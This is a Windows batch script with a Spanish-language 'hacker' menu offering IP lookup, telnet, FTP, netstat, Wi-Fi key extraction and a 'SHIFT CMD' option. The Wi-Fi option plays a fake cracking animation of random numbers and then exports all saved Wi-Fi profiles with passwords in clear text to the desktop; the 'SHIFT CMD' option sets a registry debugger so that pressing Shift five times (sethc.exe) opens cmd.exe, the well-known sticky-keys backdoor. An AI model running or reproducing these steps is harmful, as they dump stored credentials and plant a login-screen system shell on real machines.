@echo off
title MENU - VERSION 2.0
mode 60, 5
:home
set /a trt=%trt%+1
cls
echo       %trt% %        
if %trt%==100 goto menu
goto home
:menu
color a
MODE CON: COLS=127 LINES=21
set /a qq=%random%/%random%
cls
echo ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ECJECUCION:
echo ³ÛÛÛÛ     ÛÛÛÛ ÛÛÛÛÛÛÛÛÛÛ ÛÛÛÛ      ÛÛ ÛÛ        ÛÛ            ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³  FECHA - %DATE%
echo ³ÛÛ ÛÛ   ÛÛ ÛÛ ÛÛ         ÛÛ ÛÛ     ÛÛ ÛÛ        ÛÛ            º   1.) MI IP          º          ³  HORA  - %TIME%.
echo ³ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ         ÛÛ  ÛÛ    ÛÛ ÛÛ        ÛÛ            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³
echo ³ÛÛ   ÛÛÛ   ÛÛ ÛÛÛÛÛÛ     ÛÛ   ÛÛ   ÛÛ ÛÛ        ÛÛ            ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³  DIRECCION ID: %qq%
echo ³ÛÛ         ÛÛ ÛÛ         ÛÛ    ÛÛ  ÛÛ ÛÛ        ÛÛ            º   2.) TELNET         º          ³      .......
echo ³ÛÛ         ÛÛ ÛÛ         ÛÛ     ÛÛ ÛÛ ÛÛ        ÛÛ            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³  .:::::::::::::.
echo ³ÛÛ         ÛÛ ÛÛ         ÛÛ      ÛÛÛÛ ÛÛ        ÛÛ            ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³ .::'  '''''  '::.
echo ³ÛÛ         ÛÛ ÛÛÛÛÛÛÛÛÛÛ ÛÛ       ÛÛÛ ÛÛÛÛÛÛÛÛÛÛÛÛ            º   3.) FTP            º          ³ :::           :::
echo ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿           ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³ :::           :::
echo                                                    ³           ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³ ::'           '::
echo   HOLA AMIGO!ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿           ³           º   4.) CLAVE WIFI     º          ³: : /~~~' '~~~\ : :
echo                                        ³           ³           ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³:(:  ^<o^> ^| ^<o^>  :):
echo ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ           ³           ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³ .:     / \     :.'
echo ³                                                  ³           º   5.) SHIFT CMD      º          ³ ':    (. .)    :'
echo ³                                                  ³           ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³  '.  .:::::.  .'
echo ³        INDIQUE SU OPCION [1-6]                   ³           ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»          ³   :  ^<-----^>  :
echo ³                                                  ³           º   6.) NETSTAT        º          ³   '.  ~:::~  .'
echo ³                     [ 0.) SALIR ]                ³           ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼          ³     '.  '  .'
echo ³                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ       '''''
set /p com=ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ^>
if %com%==exit goto fin
if %com%==1 goto 1
if %com%==2 goto 2
if %com%==3 goto 3
if %com%==4 goto 4
if %com%==5 goto 5
if %com%==6 goto 6
if %com%==0 goto 0
cls
color c
echo su numero es incorrecto!!!
echo vuelva a intentarlo
timeout /NOBREAK /T 3 >nul
cls
goto menu

:0
exit

:1
MODE CON: COLS=25 LINES=8
cls
title mi ip
echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo º 1.IP Red wifi  º
echo º 2.IP Publica   º
echo ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo.
echo.
choice /c:12 /n >nul
if errorlevel 2 goto ip2
if errorlevel 1 goto ip1
goto menu


:ip2
echo http://www.cual-es-mi-ip.net/
start http://www.cual-es-mi-ip.net/
goto menu

:ip1
mode 1000, 1000 
ipconfig
pause >nul
goto menu




:2
color a
cls
title telnet
echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo º T   l   e       º
echo º   e   n   t     º
set /p telnet=ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»^>IP:
echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo º
set /p Puerto=ÈÍÍÍÍÍÍ^>Puerto:
start telnet %telnet% %Puerto%
goto menu



:3
cls
title FTP
echo     ________________ 
echo    / ____/_  __/ __ \
echo   / /_    / / / /_/ /
echo  / __/   / / / ____/
echo /_/     /_/ /_/ 
set /p ftp=^>Direccion #!
set /p puerto=^>Puerto    #!
start ftp %ftp% %puerto%
goto menu



:4
mode 111, 22



echo Connect Console.
:casa
echo.
cls
color 0a
echo ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo º #Opciones:       º
echo º                  º
echo º  1.Wifi-key      º
echo º  2.Salir         º
echo º                  º
echo ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
choice /c:12 /n >nul
if errorlevel 2 goto log
if errorlevel 1 goto hack



:hack
cls
echo.
echo las claves  estarar en .xml

set /a cnt=1
goto sts

:sts
cls
echo.
cd C:\users\%username%\desktop
md keY-WIFI
cls
echo  SSID/BSSID
ping localhost -n 3 >nul
:cool
set /a cnt=%cnt%+1
cls
echo.
echo  ProsesadoresÍÍÍÍ^> %random%
echo.
echo  Wifikey: %random% %random%

:cal
set /a a=%random%/%random%
set /a b=%random%/%random%
set /a c=%random%/%random%
set /a d=%random%/%random%
set /a e=%random%/%random%
set /a f=%random%/%random%
set /a g=%random%/%random%
set /a h=%random%/%random%
set /a i=%random%/%random%
goto chk
:chk
if %a%==1 goto b
if %a%==2 goto b
if %a%==3 goto b
if %a%==4 goto b
if %a%==5 goto b
if %a%==6 goto b
if %a%==7 goto b
if %a%==8 goto b
if %a%==9 goto b
if %a%==0 goto b
goto cal
:b
if %b%==1 goto c
if %b%==2 goto c
if %b%==3 goto c
if %b%==4 goto c
if %b%==5 goto c
if %b%==6 goto c
if %b%==7 goto c
if %b%==8 goto c
if %b%==9 goto c
if %b%==0 goto c
goto cal
:c
if %c%==1 goto d
if %c%==2 goto d
if %c%==3 goto d
if %c%==4 goto d
if %c%==5 goto d
if %c%==6 goto d
if %c%==7 goto d
if %c%==8 goto d
if %c%==9 goto d
if %c%==0 goto d
goto cal
:d
if %d%==1 goto e
if %d%==2 goto e
if %d%==3 goto e
if %d%==4 goto e
if %d%==5 goto e
if %d%==6 goto e
if %d%==7 goto e
if %d%==8 goto e
if %d%==9 goto e
if %d%==0 goto e
goto cal
:e
if %e%==1 goto f
if %e%==2 goto f
if %e%==3 goto f
if %e%==4 goto f
if %e%==5 goto f
if %e%==6 goto f
if %e%==7 goto f
if %e%==8 goto f
if %e%==9 goto f
if %e%==0 goto f
goto cal
:f
if %f%==1 goto g
if %f%==2 goto g
if %f%==3 goto g
if %f%==4 goto g
if %f%==5 goto g
if %f%==6 goto g
if %f%==7 goto g
if %f%==8 goto g
if %f%==9 goto g
if %f%==0 goto g
goto cal
:g
if %g%==1 goto h
if %g%==2 goto h
if %g%==3 goto h
if %g%==4 goto h
if %g%==5 goto h
if %g%==6 goto h
if %g%==7 goto h
if %g%==8 goto h
if %g%==9 goto h
if %g%==0 goto h
goto cal
:h
if %h%==1 goto i
if %h%==2 goto i
if %h%==3 goto i
if %h%==4 goto i
if %h%==5 goto i
if %h%==6 goto i
if %h%==7 goto i
if %h%==8 goto i
if %h%==9 goto i
if %h%==0 goto i
goto cal
:i
if %i%==1 goto j
if %i%==2 goto j
if %i%==3 goto j
if %i%==4 goto j
if %i%==5 goto j
if %i%==6 goto j
if %i%==7 goto j
if %i%==8 goto j
if %i%==9 goto j
if %i%==0 goto j
goto cal
:j
echo              %a%%b%%c%%d% %e%%f%%g%%h% %i%%c%%b%%d%
echo              %e%%f%%g%%h% %a%%b%%c%%d% %d%%i%%a%%f%
echo              %f%%e%%d%%a% %i%%f%%a%%c% %b%%c%%g%%a%
echo              %a%%b%%c%%d% %e%%f%%g%%h% %i%%c%%b%%d%
echo              %f%%e%%d%%a% %i%%f%%a%%c% %b%%c%%g%%a%
echo              %e%%f%%g%%h% %a%%b%%c%%d% %d%%i%%a%%f%
echo              %f%%e%%d%%a% %i%%f%%a%%c% %b%%c%%g%%a%
echo              %a%%b%%c%%d% %e%%f%%g%%h% %i%%c%%b%%d%
echo.
echo  Espere...
ping localhost -n 1 >nul
if %cnt%==100 goto hhg
goto cool

:hhg

cls
echo  wifikey Listo
echo  su wifikey.xml fueron guardados en la Ubicacion "C:\users\%username%\desktop\keY-WIFI"
echo presione cualquier letra...                           
netsh wlan export  profile folder=C:\users\%username%\desktop\keY-WIFI  key=clear >nul
pause >nul
goto menu
cls

exit
:log
echo.
echo Loging out...
ping localhost -n 4 >nul
 
goto menu



:5
title shif
cls
mode 1000, 1000
echo                                                         Instrucciones
echo                                                       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
echo                   SI NO TE FUNCIONA. SIGNIFICA QUE TIENES QUE EJECUTAR ESTE MENU O PROGRAMA EN .BAT COMO ADMINISTRADOR.
echo                PARA EJECUTARLO COMO ADMINISTRADOR A ESTE MENU O PROGRAM EN .BAT SOLO TIENE QUE IR AL ESTE PROGRAMA CON 
ECHO                EL CURSOR EN VEZ DE DARLE CLIK IZQUIERDO PARA EJECUTAR ESTE PROGRAMA LE DAN A CLIK DERECHO Y DESPUES 
ECHO                EJECUTAR COMO ADMINISTRADOR Y DESPUES LE DAN SI Y LISTO YA PUEDEN HACER TODO LO QUE APARECE EN EL MENU
ECHO                SIN NINGUN PROBLEMA O ERROR GRACIAS.
ECHO.
ECHO                          Para continuar pulse cualquier letra.
pause >nul

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
GOTO MENU




:6
START NETSTAT
GOTO MENU
